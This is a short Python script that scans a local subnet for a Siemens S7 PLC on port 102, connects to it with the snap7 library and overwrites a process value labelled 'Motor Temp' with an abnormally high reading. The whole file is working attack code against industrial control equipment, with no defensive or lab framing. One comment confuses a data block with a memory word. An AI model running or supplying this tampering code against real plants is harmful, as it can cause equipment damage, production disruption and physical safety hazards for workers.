import snap7
from snap7.util import set_int
from scapy.all import ARP, Ether, srp
import socket

# Network settings
PLC_PORT = 102  # Default S7 protocol port
SUBNET = "192.168.1.0/24"  # Adjust based on your network

def find_plc_ip(subnet):
    """Scans the network to find the Siemens PLC."""
    print("[*] Scanning network to find PLC...")
    arp_request = ARP(pdst=subnet)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout=2, verbose=False)[0]

    for _, received in result:
        try:
            # Try connecting to each found IP on port 102
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            if s.connect_ex((received.psrc, PLC_PORT)) == 0:
                print(f"[+] Found potential PLC at {received.psrc}")
                return received.psrc
        except Exception as e:
            pass

    print("[-] No PLC found.")
    return None

def modify_plc_parameter(plc_ip):
    """Connects to PLC at plc_ip and modifies a process-critical parameter."""
    try:
        plc = snap7.client.Client()
        plc.connect(plc_ip, 0, 1)  # Rack 0, Slot 1 for S7-1200

        if plc.get_connected():
            print(f"[+] Connected to PLC at {plc_ip}")

            # *** Modify a process-critical parameter ***
            db_number = 7  # Corresponds to %MW7 (Motor Temp)
            new_value = 500  # Set motor temperature abnormally high

            # Read current value
            data = plc.db_read(db_number, 0, 2)
            previous_value = int.from_bytes(data, byteorder='big', signed=True)

            print(f"[!] Changing Motor_Temp from {previous_value} → {new_value}")

            # Modify value
            set_int(data, 0, new_value)
            plc.db_write(db_number, 0, data)

            print("[+] Successfully modified Motor_Temp.")

            plc.disconnect()
        else:
            print("[-] Could not connect to PLC.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    plc_ip = find_plc_ip(SUBNET)
    if plc_ip:
        modify_plc_parameter(plc_ip)